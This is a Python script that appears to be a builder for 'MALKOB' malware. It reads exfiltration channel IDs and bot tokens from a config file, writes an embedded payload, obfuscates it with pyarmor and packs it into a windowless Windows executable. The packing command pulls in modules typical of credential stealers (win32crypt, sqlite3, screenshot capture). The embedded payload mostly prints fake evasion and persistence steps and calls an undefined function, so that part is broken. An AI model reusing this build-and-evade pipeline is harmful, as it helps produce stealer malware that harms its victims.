import os
import time
import random
import sys
import simple_colors
sys.stdout.reconfigure(encoding='utf-8')
MALKOB_current_state = os.getcwd()
print(str(os.getcwd())) 
os.chdir("MAKOB")
global MALKOB_TNT_NT
MALKOB_TNT_NT = ""
MALKOB_current_state = os.getcwd()
print(str(os.getcwd()))
print(MALKOB_current_state)
MALKOB_Tokenized_name = str(random.randint(100000,1000000))
os.chdir("..")
os.chdir("MALKOB_LTEMPLATE")
global MALKOB_IDT
print(MALKOB_current_state)
def MALKOB_PAYLOAD_CARRIER(ASSETS_NAME):
    print(str(os.getcwd()))
    NT_ASSETS_NT = MALKOB_TNT_NT
    print(NT_ASSETS_NT+">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.")
    with open(f"MALKOB_{NT_ASSETS_NT}.MALKOB", "+r") as MALKOB_CURRENT_CONFIG_READ:
     Tokenized_MALKOB_PAYLOAD_ATTR = [line.rstrip('\n') for line in MALKOB_CURRENT_CONFIG_READ]
    try:
        print(Tokenized_MALKOB_PAYLOAD_ATTR)   
        MALKOB_entry_PU_Dump_Channel_id = Tokenized_MALKOB_PAYLOAD_ATTR[1]
        MALKOB_entry_Screenshots_Dump_Channel_id = Tokenized_MALKOB_PAYLOAD_ATTR[2]
        MALKOB_entry_Token = Tokenized_MALKOB_PAYLOAD_ATTR[3]
        MALKOB_IMGB_TOKEN = Tokenized_MALKOB_PAYLOAD_ATTR[4]
        print(Tokenized_MALKOB_PAYLOAD_ATTR)
    except Exception as E:
        print(E)
        print("ERRROR")
    PAYLOAD = r'''
    import os as O0O0O0, sys as O0O0, time as O0, base64 as B64, random as R, math as M

def O0O0OO00O0O0O0O0():
    O0O0O0O0 = ''.join([chr(R.randint(65, 90)) for _ in range(16)])
    return B64.b64encode(O0O0O0O0.encode()).decode()

def O0OO0O0O0O0O0O0(data):
    return B64.b64decode(data.encode()).decode()

def O0O0O0O0O0O0():
    OOO0O0 = O0O0OO00O0O0O0O0()
    O0O0 = O0OO0O0O0O0O0O0(OOO0O0)
    print("[*] Payload decrypted:", O0O0)

def O0O0O0O0O0O0O0O0():
    s = 0
    for i in range(1, 5000):
        s += M.sin(i) * M.sqrt(i)
    print("[*] Junk calc:", s)

def O0OO0O0O0O0():
    for _ in range(1000):
        x = M.log(R.random() + 0.01) * M.tan(R.random())
    print("[*] Obfuscated math complete")

def OOO0O0O0O0O():  
    D = R.uniform(0.1, 1.5)
    print(f"[*] Sleeping {D:.2f}s to MALKOBade sandbox")
    O0.sleep(D)

def O0O0O0OO0O0O0O0():
    print("[*] Faking persistence trick")
    print("[*] Adding fake reg key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")

def O0OO0O0O0O0O0O0O0O0():
    u = O0O0O0.getlogin()
    p = sys.platform
    print(f"[*] User: {u}, Platform: {p}")

def O0O0O0O0OOO0O0():
    for _ in range(3):
        O0O0O0O0O0O0()
        O0OO0O0O0O0()
        OOO0O0O0O0O()

def __fake_network():
    fake_ip = ".".join(str(R.randint(1, 255)) for _ in range(4))
    print(f"[*] Fake C2 IP: {fake_ip}")

def __fake_file_ops():
    for _ in range(3):
        fname = ''.join(R.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + ".tmp"
        print(f"[*] Pretending to drop file: {fname}")

def __junk_loops():
    for _ in range(200):
        a = R.randint(1, 100)
        b = R.randint(1, 100)
        c = a * b / (a + 1)
    print("[*] Random junk loop done")

def __payload_chain():
    s = ''.join(chr(R.randint(97, 122)) for _ in range(50))
    e = B64.b64encode(s.encode()).decode()
    d = B64.b64decode(e.encode()).decode()
    print("[*] Fake chain decrypted:", d[:10])

def __anti_vm():
    x = R.choice([True, False])
    print("[*] Anti-VM check:", x)

def __weird_branching():
    for i in range(5):
        if R.random() > 0.5:
            O0O0O0O0O0O0()
        else:
            O0OO0O0O0O0()
def __multi_stage():
    __fake_network()
    __payload_chain()
    __junk_loops()
    __fake_file_ops()
def O0OO0O0O0O0_main():
    O0OO0O0O0O0O0O0O0O0()
    __anti_vm()
    O0O0O0O0OOO0O0()
    for _ in range(5):
        __junk_loops()
        O0O0O0O0O0O0O0O0()
        OOO0O0O0O0O()
    O0O0O0O0O0O0()
    __weird_branching()
    __multi_stage()
    O0O0O0OO0O0O0O0()
    O0O0O0O0O0O0()
for i in range(10):
    def filler_junk_function():
        z = 0
        for j in range(1000):
            z += M.sqrt(j) * M.cos(j)
        return z
    filler_junk_function()
for _ in range(20):
    __junk_loops()
def extra_crypto():
    data = ''.join([chr(R.randint(48, 122)) for _ in range(128)])
    enc = B64.b64encode(data.encode()).decode()
    dec = B64.b64decode(enc.encode()).decode()
    print("[*] Fake crypto data:", dec[:20])
for _ in range(5):
    extra_crypto()
for _ in range(5):
    if R.random() > 0.5:
        __fake_network()
    else:
        __anti_vm()
if __name__ == "__main__":
    O0OO0O0O0O0_main()

try:
 Αρχή()
except:
  Αρχή()
    '''
    os.chdir("..")
    os.chdir("MALKOB_PLAYGROUND")
    with open(f"{NT_ASSETS_NT}.py", "w", encoding="utf-8") as payload_injector:
        payload_injector.writelines(PAYLOAD)
    print(simple_colors.red(f">>GEN_ID={NT_ASSETS_NT}>>"))
    print(simple_colors.blue("INFO: Generation started please wait...."))        
    os.system(f'''pyarmor gen -O MALKOB_Obs .\{NT_ASSETS_NT}.py > NUL''')      
    os.chdir("MALKOB_Obs")    
    print(os.getcwd())
    os.system(f'''pyinstaller --noconsole --hidden-import=ctypes --hidden-import=mss --hidden-import=cryptography.fernet  --hidden-import=win32crypt --hidden-import=json --hidden-import=sqlite3 --hidden-import=requests  --hidden-import=Crypto.Cipher.AES  --hidden-import=platform --hidden-import=winshell  --onefile --name {ASSETS_NAME}  --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000" ''' + f'''"{NT_ASSETS_NT}.py"'''+''' --distpath MALKOB_ASSETS --icon=image.ico > NUL''')  
    print(simple_colors.red("INFO : Generation Completed check the PE file in the MALKOB_OBS folder."))
    os.chdir(MALKOB_current_state)    